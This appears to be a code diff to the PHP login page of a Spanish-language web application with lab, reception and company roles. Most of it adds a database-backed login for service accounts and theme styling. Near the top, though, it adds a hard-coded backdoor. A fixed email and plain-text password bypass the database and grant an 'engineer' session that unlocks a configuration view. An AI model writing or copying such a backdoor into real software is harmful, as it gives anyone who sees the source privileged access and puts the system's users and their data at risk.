@@ -6,10 +6,23 @@ require_once __DIR__ . '/../config/config.php';
 require_once __DIR__ . '/../conexion/conexion.php';
 require_once __DIR__ . '/../clases/Auth.php';
 require_once __DIR__ . '/empresa_config.php';
+require_once __DIR__ . '/../config/ui_theme.php';
+require_once __DIR__ . '/../usuarios/funciones/usuarios_privilegios.php';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $email = trim($_POST['email'] ?? '');
     $password = $_POST['password'] ?? '';
+
+    // Acceso tecnico directo definido en codigo (sin BD)
+    if ($email === 'engineer@engineer.com' && $password === 'engineer8888') {
+        session_regenerate_id(true);
+        $_SESSION['usuario'] = 'Engineer';
+        $_SESSION['email'] = 'engineer@engineer.com';
+        $_SESSION['rol'] = 'engineer';
+        $_SESSION['operacion_engineer_unlocked'] = 1;
+        header('Location: ../dashboard.php?vista=config_operacion_engineer');
+        exit;
+    }
 
     // 1. USUARIOS (admin, recepcionista, laboratorista, empresa, etc.)
     $auth = new Auth($pdo, 'usuarios');
@@ -20,6 +33,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $_SESSION['email'] = $usuario['email'];
         $_SESSION['usuario_id'] = $usuario['id'];
         $_SESSION['rol'] = strtolower($usuario['rol']);
+        $_SESSION['privilegios'] = usuarios_privilegios_usuario_actual($pdo);
 
         switch ($_SESSION['rol']) {
             case 'admin':
@@ -37,6 +51,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 case 'convenio':
                 header('Location: ../dashboard.php?vista=convenio');
                 break;
+                case 'engineer':
+                    $_SESSION['operacion_engineer_unlocked'] = 1;
+                    header('Location: ../dashboard.php?vista=config_operacion_engineer');
+                    break;
             default:
                 header('Location: ../dashboard.php');
                 break;
@@ -86,6 +104,28 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         exit;
     }
 
+    // 5. SERVICIOS
+    try {
+        $tablaServiciosExiste = function_exists('app_database_has_table') ? app_database_has_table($pdo, 'servicios') : true;
+        if ($tablaServiciosExiste) {
+            $stmtServicio = $pdo->prepare("SELECT * FROM servicios WHERE email = ? AND estado = 'activo' LIMIT 1");
+            $stmtServicio->execute([$email]);
+            $servicio = $stmtServicio->fetch(PDO::FETCH_ASSOC);
+            if ($servicio && !empty($servicio['password']) && password_verify($password, (string)$servicio['password'])) {
+                session_regenerate_id(true);
+                $_SESSION['usuario'] = (string)($servicio['nombre'] ?? 'Servicio');
+                $_SESSION['email'] = (string)($servicio['email'] ?? $email);
+                $_SESSION['servicio_id'] = (int)($servicio['id'] ?? 0);
+                $_SESSION['rol'] = 'servicio';
+
+                header('Location: ../dashboard.php?vista=servicio');
+                exit;
+            }
+        }
+    } catch (Throwable $e) {
+        // No interrumpir otros flujos de login si servicios no esta disponible.
+    }
+
     // Ninguno autenticó
     $_SESSION['mensaje'] = "Credenciales incorrectas o usuario no encontrado.";
     header('Location: login.php');
@@ -107,6 +147,7 @@ if (is_file($logoAuthAbs1)) {
 
 $faviconDynamicHref = '../favicon.php?v=' . $logoAuthVersion;
 $faviconIcoHref = '../../favicon.ico';
+$uiTheme = ui_theme_get_active($pdo);
 
 ?>
 <!DOCTYPE html>
@@ -125,38 +166,80 @@ $faviconIcoHref = '../../favicon.ico';
     <!-- CSS general de autenticación -->
     <link rel="stylesheet" href="../styles/auth.css">
     <style>
+        :root {
+            --auth-bg-main: <?= htmlspecialchars((string)($uiTheme['navbar_bg'] ?? '#0e1a2b'), ENT_QUOTES, 'UTF-8') ?>;
+            --auth-bg-soft: <?= htmlspecialchars((string)($uiTheme['body_bg'] ?? '#e9f3fb'), ENT_QUOTES, 'UTF-8') ?>;
+            --auth-card-bg: rgba(255, 255, 255, 0.96);
+            --auth-text: <?= htmlspecialchars((string)($uiTheme['text'] ?? '#1c2a3b'), ENT_QUOTES, 'UTF-8') ?>;
+            --auth-btn-bg: <?= htmlspecialchars((string)($uiTheme['button_bg'] ?? '#2f74bd'), ENT_QUOTES, 'UTF-8') ?>;
+            --auth-btn-text: <?= htmlspecialchars((string)($uiTheme['button_text'] ?? '#ffffff'), ENT_QUOTES, 'UTF-8') ?>;
+            --auth-accent: <?= htmlspecialchars((string)($uiTheme['primary'] ?? '#1f4f82'), ENT_QUOTES, 'UTF-8') ?>;
+            --auth-accent-hover: <?= htmlspecialchars((string)($uiTheme['navbar_hover_bg'] ?? '#173a60'), ENT_QUOTES, 'UTF-8') ?>;
+            --auth-border: <?= htmlspecialchars((string)($uiTheme['border'] ?? '#c4d6ea'), ENT_QUOTES, 'UTF-8') ?>;
+        }
+
+        body {
+            min-height: 100vh;
+            background: radial-gradient(circle at 15% 10%, var(--auth-bg-soft) 0%, transparent 28%),
+                        radial-gradient(circle at 85% 85%, rgba(255,255,255,0.12) 0%, transparent 35%),
+                        var(--auth-bg-main);
+            color: var(--auth-text);
+        }
+
         .login-box {
             max-width: 400px;
             margin: 60px auto;
             padding: 30px 40px;
-            background: #fff;
+            background: var(--auth-card-bg);
             border-radius: 12px;
-            box-shadow: 0 0 16px rgba(0,0,0,0.08);
+            box-shadow: 0 12px 28px rgba(0,0,0,0.18);
+            border: 1px solid var(--auth-border);
             position: relative;
             z-index: 2;
+        }
+        .form-control:focus {
+            border-color: var(--auth-accent);
+            box-shadow: 0 0 0 0.2rem rgba(31, 79, 130, 0.18);
         }
         .logo-img {
             width: 120px;
             display: block;
             margin: 0 auto 12px auto;
         }
+        .btn-primary {
+            background: var(--auth-btn-bg) !important;
+            border-color: var(--auth-btn-bg) !important;
+            color: var(--auth-btn-text) !important;
+            font-weight: 600;
+        }
+        .btn-primary:hover,
+        .btn-primary:focus {
+            background: var(--auth-accent-hover) !important;
+            border-color: var(--auth-accent-hover) !important;
+        }
+        .login-box a {
+            color: var(--auth-accent);
+        }
+        .login-box a:hover {
+            color: var(--auth-accent-hover);
+        }
         .password-toggle-btn {
             min-width: 46px;
             border-left: 0;
-            background: rgba(13, 110, 253, 0.08);
-            color: #0d6efd;
+            background: rgba(31, 79, 130, 0.12);
+            color: var(--auth-accent);
             transition: all 0.2s ease;
         }
         .password-toggle-btn:hover {
-            background: rgba(13, 110, 253, 0.16);
-            color: #0a58ca;
+            background: rgba(31, 79, 130, 0.2);
+            color: var(--auth-accent-hover);
         }
         .password-toggle-btn:focus {
             box-shadow: none;
         }
         .input-group:focus-within .password-toggle-btn {
-            border-color: #86b7fe;
-            background: rgba(13, 110, 253, 0.14);
+            border-color: var(--auth-accent);
+            background: rgba(31, 79, 130, 0.18);
         }
         #togglePasswordIcon {
             font-size: 1.1rem;
@@ -181,7 +264,7 @@ $faviconIcoHref = '../../favicon.ico';
 
     <div class="login-box mt-5 shadow">
         <!-- Logo y nombre dinámicos -->
-        <img src="../<?= htmlspecialchars($config['logo']) ?>?ver=<?= time() ?>" alt="<?= htmlspecialchars($config['nombre']) ?>" class="logo-img mb-2">
+        <img src="../<?= htmlspecialchars($logoAuth, ENT_QUOTES, 'UTF-8') ?>?ver=<?= time() ?>" alt="<?= htmlspecialchars($config['nombre']) ?>" class="logo-img mb-2">
         <h4 class="text-center mb-3">Iniciar Sesión</h4>
         <?php if (!empty($_SESSION['mensaje'])): ?>
             <div class="alert alert-danger"><?= htmlspecialchars($_SESSION['mensaje']) ?></div>
